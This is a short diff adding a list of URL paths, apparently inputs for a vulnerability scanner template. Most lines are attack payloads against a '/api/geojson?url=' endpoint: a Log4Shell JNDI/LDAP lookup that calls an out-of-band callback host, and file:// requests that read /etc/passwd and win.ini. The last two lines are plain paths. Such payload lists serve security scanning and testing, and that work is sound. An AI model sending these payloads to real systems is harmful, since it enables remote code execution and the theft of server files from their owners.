@@ -1,0 +1,5 @@
+/api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}
+/api/geojson?url=file:///etc/passwd
+/api/geojson?url=file:///c://windows/win.ini
+/setup
+/auth/login
